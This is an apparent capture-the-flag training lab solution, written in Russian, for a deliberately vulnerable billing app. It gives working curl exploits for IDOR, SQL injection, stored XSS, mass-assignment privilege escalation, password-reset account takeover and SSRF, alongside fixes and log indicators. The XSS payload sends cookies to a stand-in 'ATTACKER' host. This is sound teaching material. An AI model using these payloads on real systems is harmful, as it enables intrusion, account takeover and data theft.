# SOLUTION — app2 Billing (OWASP, правка кода)

`vulnerable/src` и `reference/src` — **разный** код. Общая схема/статика — `apps/app2-billing/shared/`.
Флаги: `TRN{<32 hex>}` (`@hacktraining/shared`). Значения флагов в логи не пишутся.

Каждая уязвимость: **где · эксплуатация 1:1 (curl) · где флаг · фикс · след в логах**. Команды copy-paste,
`jq` не требуется — извлечение полей на `grep/sed` (для изолированной лабы без интернета).

```bash
# Общие переменные (локальный запуск / compose). BASE — уязвимый стенд.
BASE=http://127.0.0.1:3011
# Сид-пользователи: alice/alice123, bob/bob123, carol/carol123 (обычные), админ отдельно.
grepflag(){ grep -oE 'TRN\{[0-9a-f]{32}\}'; }              # извлечь флаг из любого ответа
jval(){ grep -oE "\"$1\":\"?[^\",}]+" | head -1 | sed -E "s/.*:\"?//"; }  # поле JSON без jq
```

---

## V2.1 A01 IDOR — `A01-IDOR`

- **Где (vuln):** `GET /api/invoices/:id` без проверки владельца (`vulnerable/src/routes/invoices.ts`)
- **Где флаг:** `invoices.memo` жертвы (bob, счёт «Confidential retainer»)
- **Фикс:** `owner_id === req.user.id || admin`; иначе **404** (не 403 — не раскрываем существование)
- **Логи:** `authz.allow` с `resourceOwner != requester` (vuln) / `authz.deny` (ref)

```bash
# 1) Логинимся обычным пользователем alice и забираем JWT
TOKEN=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jval token)

# 2) Проверки владельца нет — перебираем id чужих счетов и читаем memo.
#    Флаг лежит в счёте bob, но alice его видеть не должна.
for id in $(seq 1 20); do
  echo -n "invoice #$id: "
  curl -s $BASE/api/invoices/$id -H "Authorization: Bearer $TOKEN" | grepflag || echo "-"
done
```

Шорткат: `node tools/attacker-scripts/app2/idor.mjs --base $BASE`

---

## V2.2 A03 SQL-инъекция — `A03-SQLI`

- **Где:** `GET /api/invoices?q=` — параметр конкатенируется в SQL (`WHERE title ILIKE '%q%' OR memo ILIKE '%q%'`)
- **Где флаг:** скрытая таблица `secret_flags` (штатным API не отдаётся)
- **Фикс:** `$1`-placeholders + allow-list поля `sort` + фильтр `owner_id = $1`
- **Логи:** `sql.error`; в PostgreSQL при `log_statement=all` — сырой инъектированный SQL

```bash
TOKEN=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jval token)

# UNION закрывает строку в ILIKE и подставляет 5 колонок под исходный SELECT
# (id, title, amount_cents, status, memo). '-- -' комментирует остаток запроса.
curl -s -G $BASE/api/invoices -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=' UNION SELECT id, name, 0, 'open', value FROM secret_flags-- -" \
  | grepflag
```

Шорткат: `node tools/attacker-scripts/app2/sqli.mjs --base $BASE`

---

## V2.3 A03 Stored XSS — `A03-XSS`

- **Где:** `bio`/комментарии рендерятся в EJS как `<%- %>` (без экранирования); cookie `bill_token` без `HttpOnly`
- **Где флаг:** `admin_notes.body` (виден только админу на `/admin` → `GET /api/admin/note`)
- **Фикс:** `<%= %>` (экранирование) + `HttpOnly` cookie + CSP через helmet
- **Логи:** `content.store` с payload, содержащим `<script`/`onerror=`

```bash
# 1) Обычный пользователь сохраняет XSS-пейлоад в bio.
#    Когда админ откроет /admin, скрипт выполнится в его сессии и утечёт cookie.
TOKEN=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jval token)
curl -s -X PATCH $BASE/api/profile -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"bio":"<script>new Image().src=\"http://ATTACKER:8000/c?\"+document.cookie</script>"}'

# 2) Админ заходит на /admin -> cookie утекает на ATTACKER. С украденным токеном:
curl -s $BASE/api/admin/note -H "Authorization: Bearer <УКРАДЕННЫЙ_ADMIN_JWT>" | grepflag
```

Шаг «админ открывает /admin и крадётся cookie» в автоматическом виде выполняет PoC (симулирует
DOM админа через jsdom и достаёт флаг end-to-end):
`node tools/attacker-scripts/app2/xss.mjs --base $BASE`

---

## V2.4 Mass-assignment → privesc — `A04-MASSASSIGN`

- **Где:** `PATCH /api/profile` делает `Object.assign(user, req.body)` — включая `role`
- **Где флаг:** `GET /api/admin/flag` (только для админа) — значение сажается плантером в
  `secret_flags(admin_flag)` каждый тик (`vuln_id: A04-MASSASSIGN`), не из `ADMIN_FLAG` env
- **Фикс:** явный allow-list полей `{display_name, avatar_url, bio}`; `role` меняется отдельным admin-путём
- **Логи:** `role.change` вне админского пути (vuln)

```bash
# 1) Логин обычным пользователем
TOKEN=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jval token)

# 2) Передаём role=admin в обновление профиля -> сервер сохраняет и выдаёт НОВЫЙ JWT с role=admin
NEWTOKEN=$(curl -s -X PATCH $BASE/api/profile -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"role":"admin"}' | jval token)

# 3) Теперь доступен admin-only флаг
curl -s $BASE/api/admin/flag -H "Authorization: Bearer $NEWTOKEN" | grepflag
```

Шорткат: `node tools/attacker-scripts/app2/mass-assign.mjs --base $BASE`

---

## V2.5 Криптосбои / захват через reset — `A02-CRYPTO`

- **Где:** пароли как MD5; `reset_token = String(Date.now())` (предсказуем) и **возвращается в ответе API**
- **Где флаг:** `users.private_note` аккаунта carol (виден в `GET /api/profile` после входа)
- **Фикс:** `bcrypt` + `crypto.randomBytes(32)` + TTL + одноразовость; токен не возвращать в API
- **Логи:** `reset.request` → `reset.consume` для чужого аккаунта за секунды

```bash
# 1) Запрашиваем сброс пароля carol. Уязвимый эндпоинт отдаёт предсказуемый токен прямо в ответе.
RTOKEN=$(curl -s $BASE/api/reset/request -H 'Content-Type: application/json' \
  -d '{"username":"carol"}' | jval resetToken)

# 2) Ставим carol свой пароль по этому токену
curl -s $BASE/api/reset/confirm -H 'Content-Type: application/json' \
  -d "{\"token\":\"$RTOKEN\",\"newPassword\":\"pwned123\"}"

# 3) Входим как carol и читаем приватную заметку с флагом
CT=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"carol","password":"pwned123"}' | jval token)
curl -s $BASE/api/profile -H "Authorization: Bearer $CT" | grepflag
```

Шорткат: `node tools/attacker-scripts/app2/crypto-reset.mjs --base $BASE`

---

## V2.6 SSRF — `A10-SSRF`

- **Где:** `POST /api/profile/avatar` делает `fetch(userUrl)` без валидации хоста
- **Где флаг:** ответ внутреннего сервиса `internal-metadata` (доступен только из пода app).
  Флаг per-team: стенд передаёт `X-Stand-Team` при fetch; плантер сажает `A10-SSRF` для каждой команды.
- **Фикс:** allow-list схем/хостов, блок `localhost`/приватных диапазонов/metadata, таймаут, запрет redirects
- **Логи:** `upload.url.fetch` с приватным target (vuln) / `ssrf.blocked` (ref)

```bash
TOKEN=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jval token)

# Сервер сам ходит по avatarUrl и возвращает превью тела ответа -> цельём во внутренний сервис.
# В compose/k8s app-контейнер резолвит internal-metadata по DNS:
curl -s -X POST $BASE/api/profile/avatar -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"avatarUrl":"http://internal-metadata:3099/flag"}' | grepflag

# Если app запущен на хосте (не в контейнере) — цель по 127.0.0.1:
#   -d '{"avatarUrl":"http://127.0.0.1:3099/flag"}'
```

Шорткат: `node tools/attacker-scripts/app2/ssrf.mjs --base $BASE --metadata http://internal-metadata:3099/flag`
